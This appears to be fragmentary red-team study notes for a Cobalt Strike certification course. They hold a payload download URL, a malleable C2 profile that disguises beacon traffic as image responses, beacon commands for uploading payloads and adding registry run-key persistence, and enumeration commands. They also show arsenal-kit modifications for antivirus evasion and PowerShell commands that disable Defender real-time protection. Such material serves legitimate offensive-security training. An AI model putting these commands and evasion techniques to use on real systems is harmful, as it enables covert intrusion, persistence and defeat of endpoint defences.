...
http://bforgbdaurgjettxago.com:801/bacon.ps1


## My Custom C2 profile

```powershell
# Custom C2 Profile for CRTO
set sample_name "APT99";
set sleeptime "3000";
set jitter    "20";
...
http-get {
	set uri "/admin/dashboard /admin/profile";
	...
	server {
		...
		output{
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
		                prepend "\x47\x34\x12\x81\x61\x21\x01\x00\x01\x00\x00\x39\x00\x00\x00";
			print;
		}
	}
}
...
http-post {
	set uri "/admin/upload /admin/download";
...
http-get {
        ...
        client {
                ...
                header "Accept-X-Header" "gzip, deflate";
                header "Referer" "https://www.google.com";
        ...
        server {
                # customize soerver indicators
                header "Content-Type" "webp/gif";
                header "Server" "Apache I guess LOL/10.0";
                header "X-Powered-By" "ASP.FUCK";
...
# Note: `amsi_disable` only applies to `powerpick`, `execute-assembly1` and `psinject`.  It **does not** apply to the powershell command.
...
beacon> upload C:\Payloads\hostname_x64.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\Users\bfarmer\sawyer\hostname_x64.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
...
# localadminaccess
execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Invoke-CheckLocalAdminAccess
...
- can only relay HTTP not HTTPs to LDAP
- what if my listener is on port 80? i kill myself just set the listener HTTPs
- what if im not admin to create firewall rules?
	- might need to check out that edge case scenario
...
### Extensions/Defender Antivirus

**Changes starting at line 45/117 in `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c`**
...
**Changes starting at line 130 in `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\bypass-pipe.c`**

```python
sprintf(pipename, "%c%c%c%c%c%c%c%c%cctfreader\\jess_svc", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```

```python
# Compile the mimikatz kit
...
# Verify if the payload is AV Safe
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi

# Load the CNA files: Cobalt Strike > Script Manager > Load and select the CNA
# Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`
...
# Change default psexec service name from 7 random characters
beacon> ak-settings service bigmode

# Disable Defender from local powershell session
Get-MPPreference
Set-MPPreference -DisableRealtimeMonitoring $true # Only one necessary, others are for opsec safety
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
